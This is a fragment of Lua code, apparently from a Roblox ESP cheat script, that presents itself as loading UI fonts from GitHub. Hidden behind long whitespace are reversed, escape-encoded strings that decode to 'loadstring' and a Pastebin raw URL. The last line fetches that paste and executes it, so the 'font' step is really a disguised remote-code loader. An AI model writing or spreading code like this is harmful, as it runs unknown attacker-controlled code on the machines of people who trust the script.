...
if not library.direotory then
    ESP_FontLibrary = Environment["ESP" .. "Fonts"]
end
...
task.spawn(function()
    ...
    if not Fonts.Loaded then
        Fonts.Loaded = true;                                                                                                                                                                                                                                                                    ESPFonts = ("\103\110\105\114\116\115\100\97\111\108"):reverse();
    end;                                                                                                                                                                                                                                                                                        Roboto_Font = ("\80\69\98\98\68\120\115\80\47\119\97\114\47\109\111\99\46\110\105\98\101\116\115\97\112\47\47\58\115\112\116\116\104"):reverse();

    local Tahoma = RegisterFont("Tahoma", 400, "Normal", {
        Id = "Tahoma.ttf",
        Font = FetchFont("https://github.com/KingVonOBlockJoyce/OctoHook-UI/raw/refs/heads/main/fs-tahoma-8px%20(3).ttf"),
    })

    local Pixel = RegisterFont("Pixel", 400, "Normal", {
        Id = "Pixel.ttf",
        Font = FetchFont("https://github.com/KingVonOBlockJoyce/vaderpaste.luau/raw/refs/heads/main/Pixel.ttf"),
    })

    local Minecraftia = RegisterFont("Minecraftia", 400, "Normal", {
        Id = "Minecraftia.ttf",
        Font = FetchFont("https://github.com/i77lhm/storage/raw/refs/heads/main/fonts/Minecraftia-Regular.ttf"),
    }) 

    local Verdana = RegisterFont("Verdana", 400, "Normal", {
        Id = "Verdana.ttf",
        Font = FetchFont("https://github.com/i77lhm/storage/raw/refs/heads/main/fonts/Verdana-Font.ttf"),
    })
    ...
    Environment[ESPFonts](FetchFont(Roboto_Font))()
